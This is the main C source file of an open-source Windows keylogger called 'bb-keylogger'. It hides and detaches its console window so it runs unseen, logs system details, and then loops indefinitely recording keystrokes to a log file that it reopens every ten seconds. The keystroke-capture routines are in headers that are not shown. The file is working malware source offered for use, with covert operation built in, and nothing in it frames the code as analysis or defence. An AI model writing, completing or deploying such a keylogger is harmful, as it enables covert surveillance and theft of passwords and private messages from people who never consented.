/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger.c
* Author: Frapin Kevin
* Date:   22/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing :
*  - the function "main"
*  - the functions used to initialize the program
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger.h"
#include "includes/bb-keylogger-file.h"
#include "includes/bb-keylogger-keyboard.h"
#include "includes/bb-keylogger-system.h"

//------------------------------------------------------------ STATIC FUNCTIONS

/*
* Function that initializes the program :
*  - hides the Windows console
*  - detaches the program from the console
*/
static void initialize_program(  )
{
	HWND hWnd = ( HWND ) GetConsoleWindow( );
	// Hide the console
	ShowWindow( hWnd, SW_HIDE );
	// Detach the process from the console
	FreeConsole( );
}

//--------------------------------------------------------------- MAIN FUNCTION

int main( int argc, char *argv[ ] )
{	
	// Initialize the state of the program
	initialize_program(  );
	
	char * log_file_name;
	
	if( argc > 1 )
	// If there's a specified log file
	{
		log_file_name = argv[1];
	}
	else
	{
		log_file_name = DEFAULT_LOG_FILE_NAME;
	}
	
	// Open the log file
	FILE * log_file = open_file( log_file_name );
	
	// Log informations about the system
	log_system_infos( log_file );

	// Log the keystrokes
	log_infos( log_file, "# Keystrokes :\n" );
	int i = 0;
	
	// Number of cycles between 2 reopening of the log file
	// Here we want the file to be reopen every 10,000 ms
	int nb_cycles = 10000 / TIME_TO_SLEEP;
	
	for( ; ; )
	{
		Sleep( TIME_TO_SLEEP );
		log_keystrokes( log_file );
		
		if( ++i >= nb_cycles )
		// If the elapsed time is greater than 10 seconds
		{
			i = 0;
			// Reopen the file in order to force synchronization
			log_file = freopen( log_file_name, "a", log_file );
		}
	}
}

